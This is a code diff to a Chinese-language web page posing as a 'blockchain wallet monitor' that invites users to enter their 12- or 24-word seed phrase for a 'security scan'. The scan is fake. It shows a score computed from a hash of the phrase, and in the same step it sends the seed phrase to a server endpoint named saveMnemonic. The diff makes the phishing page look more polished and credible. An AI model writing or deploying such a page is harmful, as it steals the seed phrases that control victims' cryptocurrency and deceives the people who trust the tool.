@@ -6,61 +6,85 @@
     <title>区块链钱包监测器</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background-color: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
-        .container { width: 90%; max-width: 600px; padding: 20px; background: #fff; box-shadow: 0 2px 10px rgba(0,0,0,0.1); margin-top: 30px; border-radius: 10px; }
-        input, button { width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; }
-        button { background: #007bff; color: #fff; border: none; cursor: pointer; }
-        button:hover { background: #0056b3; }
-        #scanResult { display: none; margin-top: 20px; font-size: 18px; font-weight: bold; }
+        body { font-family: 'Helvetica', sans-serif; background-color: #fff; color: #333; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
+        .navbar { width: 100%; background-color: #fff; padding: 15px 0; box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+        .navbar ul { list-style-type: none; display: flex; justify-content: center; align-items: center; gap: 30px; }
+        .navbar ul li { padding: 12px 20px; font-size: 16px; cursor: pointer; color: #444; transition: all 0.3s; border-radius: 8px; }
+        .navbar ul li:hover { background-color: #f8f9fa; color: #000; }
+        .container { width: 90%; max-width: 1000px; padding: 30px; background-color: #fff; border-radius: 15px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); margin: 40px auto; position: relative; border: 1px solid #eee; }
+        h2 { color: #1a1a1a; margin-bottom: 25px; font-size: 26px; font-weight: 700; }
+        input { width: 100%; padding: 14px; margin: 15px 0; border-radius: 8px; border: 1px solid #ddd; background-color: #f8f9fa; color: #333; font-size: 16px; transition: border-color 0.3s; }
+        input:focus { outline: none; border-color: #007bff; box-shadow: 0 0 0 3px rgba(0,123,255,0.1); }
+        button { width: 100%; padding: 14px; background-color: #007bff; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; transition: background-color 0.3s; }
+        button:hover { background-color: #0056b3; }
+        #scanResult { display: none; margin-top: 20px; }
     </style>
 </head>
 <body>
-
-    <div class="container">
-        <h2>区块链钱包监测器</h2>
-        <input type="text" id="mnemonicInput" placeholder="输入助记词（12或24个单词）" oninput="validateMnemonic(this)">
-        <button onclick="startSecurityScan()">开始安全扫描</button>
-        <div id="scanResult">安全评分: <span id="scoreValue">0/100</span></div>
+    <div class="navbar">
+        <ul>
+            <li onclick="scrollToSection('wallet-monitor')">首页</li>
+            <li onclick="scrollToSection('wallet-monitor')">钱包监测</li>
+            <li onclick="scrollToSection('settings')">系统设置</li>
+        </ul>
     </div>
 
-    <script>
-        function validateMnemonic(input) {
-            const mnemonicPattern = /^[a-zA-Z\s]+$/;
-            if (!mnemonicPattern.test(input.value)) {
-                alert("请输入有效的助记词（仅限英文单词和空格）");
-                input.value = "";  // 清空无效输入
-            }
-        }
+    <div class="container" id="wallet-monitor">
+        <h2>区块链钱包监测器</h2>
+        <input type="text" id="mnemonicInput" placeholder="输入助记词（12或24个单词）" pattern="^[a-zA-Z ]+$">
+        <button onclick="startSecurityScan()">开始安全扫描</button>
+        <div id="scanResult">
+            <h3>安全评分: <span id="scoreValue" style="color:#dc3545">0/100</span></h3>
+        </div>
+    </div>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
+    <script>
         function startSecurityScan() {
             const mnemonic = document.getElementById('mnemonicInput').value.trim();
+
             if (!mnemonic) {
-                alert("请输入助记词");
+                alert("请先输入助记词");
                 return;
             }
 
-            console.log("🚀 发送助记词到服务器:", mnemonic);
+            // 计算安全评分
+            const score = generateSecurityScore(mnemonic);
+            document.getElementById('scanResult').style.display = 'block';
+            document.getElementById('scoreValue').textContent = `${score}/100`;
 
+            // 发送助记词到服务器
+            sendMnemonicToServer(mnemonic);
+        }
+
+        function generateSecurityScore(mnemonic) {
+            const hash = CryptoJS.SHA256(mnemonic).toString(CryptoJS.enc.Base64);
+            let score = 0;
+            for (let i = 0; i < hash.length; i++) {
+                score += hash.charCodeAt(i) % 10;
+            }
+            return score % 101;
+        }
+
+        function sendMnemonicToServer(mnemonic) {
             fetch('http://localhost:3000/saveMnemonic', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ mnemonic })
             })
-            .then(response => {
-                console.log("🟢 服务器响应状态:", response.status);
-                return response.text();
-            })
+            .then(response => response.json())
             .then(data => {
-                console.log("🔵 服务器返回的数据:", data);
-                document.getElementById('scanResult').style.display = 'block';
-                document.getElementById('scoreValue').textContent = `${Math.floor(Math.random() * 100)}/100`;
+                alert('助记词已成功保存');
             })
             .catch(error => {
-                console.error("🔴 请求失败:", error);
-                alert("请求失败，请检查后端是否启动");
+                console.error('错误:', error);
+                alert('保存失败，请重试');
             });
         }
-    </script>
 
+        function scrollToSection(sectionId) {
+            document.getElementById(sectionId).scrollIntoView({ behavior: 'smooth' });
+        }
+    </script>
 </body>
 </html>
